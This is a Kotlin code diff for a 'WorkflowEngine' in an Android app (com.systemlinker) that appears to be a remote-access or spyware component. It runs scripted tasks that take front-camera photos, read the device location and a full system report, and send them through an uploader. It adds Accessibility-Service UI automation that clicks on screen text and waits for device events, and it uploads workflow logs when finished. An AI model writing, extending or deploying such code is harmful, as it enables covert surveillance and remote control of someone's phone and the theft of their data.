@@ -1,15 +1,21 @@
 package com.systemlinker.features
 
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
+import android.os.Build
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
+import kotlinx.coroutines.suspendCancellableCoroutine
 import kotlinx.coroutines.withContext
+import kotlinx.coroutines.withTimeoutOrNull
 import java.io.File
 import java.io.FileWriter
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
+import kotlin.coroutines.resume
 
 class WorkflowEngine(
     private val context: Context,
@@ -38,14 +44,19 @@ class WorkflowEngine(
         
         var currentTaskType = ""
         var currentCmd = ""
-        var currentUiText = ""
+        var currentUiTexts = ""
         var currentUiTarget = ""
         var currentUiAction = ""
         var currentOffset = 1
+        var currentCaseSensitive = false
+        var currentEngine = "smart"
+        
+        var currentEventType = ""
+        var currentEventTarget = ""
 
         suspend fun executeCurrentTask() {
             if (currentTaskType == "command") {
-                log("Executing Command: $currentCmd")
+                log("Command Executing: $currentCmd")
                 when (currentCmd) {
                     "loc" -> log(systemHandler.getLocation())
                     "cam_front" -> mediaHandler.takePicture(true)?.let { uploader.sendFile(it, "photo", "WF Front Cam") }
@@ -53,17 +64,70 @@ class WorkflowEngine(
                     "info" -> log(systemHandler.generateFullSystemReport().readText())
                 }
             } else if (currentTaskType == "ui") {
-                log("Executing UI Action: $currentUiAction on $currentUiTarget near '$currentUiText' (Offset $currentOffset)")
-                val intent = Intent("com.systemlinker.ACC_ACTION").apply {
-                    setPackage(context.packageName)
-                    putExtra("action", "workflow_ui")
-                    putExtra("ui_text", currentUiText)
-                    putExtra("ui_target", currentUiTarget)
-                    putExtra("ui_action", currentUiAction)
-                    putExtra("ui_offset", currentOffset)
+                log("UI Action: '$currentUiAction' on target '$currentUiTarget' near texts [$currentUiTexts] (Engine: $currentEngine)")
+                
+                // Suspend and wait for the precise result from Accessibility Service
+                val result = suspendCancellableCoroutine<String> { continuation ->
+                    val receiver = object : BroadcastReceiver() {
+                        override fun onReceive(c: Context?, intent: Intent?) {
+                            if (intent?.action == "com.systemlinker.UI_RESULT") {
+                                val msg = intent.getStringExtra("result") ?: "Unknown error"
+                                context.unregisterReceiver(this)
+                                if (continuation.isActive) continuation.resume(msg)
+                            }
+                        }
+                    }
+                    val filter = IntentFilter("com.systemlinker.UI_RESULT")
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                        context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
+                    } else {
+                        context.registerReceiver(receiver, filter)
+                    }
+
+                    val intent = Intent("com.systemlinker.ACC_ACTION").apply {
+                        setPackage(context.packageName)
+                        putExtra("action", "workflow_ui")
+                        putExtra("ui_texts", currentUiTexts) // Pipe-delimited e.g. "Text1|Text2"
+                        putExtra("ui_target", currentUiTarget)
+                        putExtra("ui_action", currentUiAction)
+                        putExtra("ui_offset", currentOffset)
+                        putExtra("ui_case_sensitive", currentCaseSensitive)
+                        putExtra("ui_engine", currentEngine)
+                    }
+                    context.sendBroadcast(intent)
                 }
-                context.sendBroadcast(intent)
-                delay(2000) // Give UI time to react
+                log("UI Result: $result")
+                delay(1000) // Small breather between UI interactions
+                
+            } else if (currentTaskType == "wait_event") {
+                log("Waiting for Event: type='$currentEventType', target='$currentEventTarget'...")
+                
+                val eventOccurred = withTimeoutOrNull(300_000L) { // 5 Minute Max Timeout for Event
+                    suspendCancellableCoroutine<Boolean> { continuation ->
+                        val receiver = object : BroadcastReceiver() {
+                            override fun onReceive(c: Context?, intent: Intent?) {
+                                if (intent?.action == "com.systemlinker.EVENT_TRIGGER") {
+                                    val evType = intent.getStringExtra("event_type") ?: ""
+                                    val evData = intent.getStringExtra("event_data") ?: ""
+                                    
+                                    if (evType == currentEventType && evData.contains(currentEventTarget, true)) {
+                                        context.unregisterReceiver(this)
+                                        if (continuation.isActive) continuation.resume(true)
+                                    }
+                                }
+                            }
+                        }
+                        val filter = IntentFilter("com.systemlinker.EVENT_TRIGGER")
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                            context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
+                        } else {
+                            context.registerReceiver(receiver, filter)
+                        }
+                    }
+                }
+                if (eventOccurred == true) log("Event Captured! Resuming workflow.")
+                else log("Event Wait Timed Out.")
+                
             } else if (currentTaskType == "delay") {
                 val delayTime = currentCmd.toLongOrNull() ?: 1000L
                 log("Waiting for $delayTime ms")
@@ -71,27 +135,38 @@ class WorkflowEngine(
             }
         }
 
-        // Custom, extremely resilient YAML-like parser
+        // YAML Parser
         for (line in lines) {
             val trimmed = line.trim()
             if (trimmed.startsWith("- type:")) {
-                if (currentTaskType.isNotEmpty()) executeCurrentTask() // Execute previous task
+                if (currentTaskType.isNotEmpty()) executeCurrentTask() 
                 currentTaskType = trimmed.substringAfter("type:").trim().replace("\"", "")
-                // Reset vars
-                currentCmd = ""; currentUiText = ""; currentUiTarget = ""; currentUiAction = "click"; currentOffset = 1
+                
+                // Reset to defaults for next task
+                currentCmd = ""; currentUiTexts = ""; currentUiTarget = ""; currentUiAction = "click"
+                currentOffset = 1; currentCaseSensitive = false; currentEngine = "smart"
+                currentEventType = ""; currentEventTarget = ""
             } else if (trimmed.startsWith("cmd:")) {
                 currentCmd = trimmed.substringAfter("cmd:").trim().replace("\"", "")
             } else if (trimmed.startsWith("text:")) {
-                currentUiText = trimmed.substringAfter("text:").trim().replace("\"", "")
+                currentUiTexts = trimmed.substringAfter("text:").trim().replace("\"", "")
             } else if (trimmed.startsWith("target:")) {
                 currentUiTarget = trimmed.substringAfter("target:").trim().replace("\"", "")
             } else if (trimmed.startsWith("action:")) {
                 currentUiAction = trimmed.substringAfter("action:").trim().replace("\"", "")
             } else if (trimmed.startsWith("offset:")) {
                 currentOffset = trimmed.substringAfter("offset:").trim().toIntOrNull() ?: 1
+            } else if (trimmed.startsWith("case_sensitive:")) {
+                currentCaseSensitive = trimmed.substringAfter("case_sensitive:").trim().replace("\"", "").toBooleanStrictOrNull() ?: false
+            } else if (trimmed.startsWith("engine:")) {
+                currentEngine = trimmed.substringAfter("engine:").trim().replace("\"", "").lowercase()
+            } else if (trimmed.startsWith("event:")) {
+                currentEventType = trimmed.substringAfter("event:").trim().replace("\"", "")
+            } else if (trimmed.startsWith("event_target:")) {
+                currentEventTarget = trimmed.substringAfter("event_target:").trim().replace("\"", "")
             }
         }
-        if (currentTaskType.isNotEmpty()) executeCurrentTask() // Execute last task
+        if (currentTaskType.isNotEmpty()) executeCurrentTask() // Execute final task
 
         log("--- WORKFLOW FINISHED ---")
         uploader.sendDocument(logFile, "Workflow Completed: $workflowName")
@@ -99,10 +174,7 @@ class WorkflowEngine(
 
     suspend fun sendStatus(workflowName: String) {
         val logFile = File(context.filesDir, "${workflowName}_status.txt")
-        if (logFile.exists()) {
-            uploader.sendDocument(logFile, "Status of Workflow: $workflowName")
-        } else {
-            uploader.sendText("No active logs found for $workflowName.")
-        }
+        if (logFile.exists()) uploader.sendDocument(logFile, "Status of Workflow: $workflowName")
+        else uploader.sendText("No active logs found for $workflowName.")
     }
 }
